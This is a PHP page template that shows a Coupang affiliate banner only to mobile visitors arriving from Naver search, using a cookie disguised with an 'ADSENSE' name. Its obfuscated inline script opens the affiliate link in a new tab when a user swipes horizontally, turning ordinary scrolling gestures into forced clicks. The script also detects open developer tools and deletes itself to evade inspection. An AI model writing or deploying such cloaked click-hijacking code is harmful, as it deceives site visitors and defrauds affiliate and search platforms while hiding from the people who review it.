<?php
    $banner = [
        'banner_url'  => 'https://image8.coupangcdn.com/image/affiliate/event/promotion/2026/01/26/805afe0b1b6a0047010ba38d00c84d73.png', // 프로모션 이미지
        'banner_link' => 'https://link.coupang.com/a/dz9aTr'    // 프로모션 링크
    ];

    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $isMobile = preg_match('/Mobile|Android|iP(hone|od|ad)/i', $ua);

    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $isNaver = (strpos($referer, 'm.search.naver.com') !== false);

    $naverCookie = $_COOKIE['ADSENSE0101'] ?? '';
    $isNaverFirstVisit = ($isMobile && $isNaver && empty($naverCookie));

    $exposureFreq = 70; // 노출 확률 %
    $distants = 40;  // 스와이프 거리

    $isFirstNaver = ($isNaverFirstVisit && mt_rand(1,100) <= $exposureFreq);

    if ($isNaverFirstVisit) {
        setcookie('ADSENSE0101', '1', time() + 86400, '/');
    }
?>

<?php if ($isFirstNaver): ?>

<div id="promoBanner"
     style="margin:40px auto;
            position:relative;
            width:92%;
            max-width:720px;
            overflow:hidden;
            background:#fafafa;
            border-radius:12px;
            box-shadow:0 6px 18px rgba(0,0,0,.06);
            text-align:center;
            padding:14px 12px;">

    <div class="img-wrap" style="cursor:pointer;">
        <p style="font-size:.95em;
                  line-height:1.5;
                  color:#444;
                  margin:0 0 10px;">
            <strong style="color:#111;">[안내]</strong>
            본 콘텐츠에는 제휴 링크가 포함되어 있으며,<br>
            이용 시 사이트 운영에 도움이 될 수 있습니다.
        </p>

        <img src="<?= esc($banner['banner_url']) ?>"
             alt="프로모션 안내 이미지"
             referrerpolicy="no-referrer"
             style="width:100%;
                    max-width:640px;
                    height:auto;
                    display:block;
                    margin:0 auto;
                    border-radius:10px;"
             onclick="window.open('<?= esc($banner['banner_link']) ?>','_blank')">
    </div>
</div>

<script id="bs-script">!function(_0x3e1f,$,w){$(function(){var _0x1=0,_0x2=!1,_0x3=!1,_0x5="<?=esc($banner['banner_link'])?>",_0x6=function(){var s=document.getElementById("bs-script");s&&s.remove()},_0x7=160,_0x8=setInterval(function(){(w.outerWidth-w.innerWidth>_0x7||w.outerHeight-w.innerHeight>_0x7)&&(_0x6(),clearInterval(_0x8))},500);$(".img-wrap").on(_0x3e1f[0],function(e){_0x1=e.originalEvent.touches[0].clientX,_0x2=!0});$(document).on(_0x3e1f[1],function(e){if(!_0x2||_0x3)return;var x=e.originalEvent.touches[0].clientX-_0x1;x><?= (int)$distants?>&&(_0x3=!0,setTimeout(function(){w.open(_0x5,"_blank"),_0x6()},1e3))});$(document).on(_0x3e1f[2],function(){_0x2=!1})})}(["\x74\x6F\x75\x63\x68\x73\x74\x61\x72\x74","\x74\x6F\x75\x63\x68\x6D\x6F\x76\x65","\x74\x6F\x75\x63\x68\x65\x6E\x64\x20\x74\x6F\x75\x63\x68\x63\x61\x6E\x63\x65\x6C"],jQuery,window);</script>

<?php endif; ?>
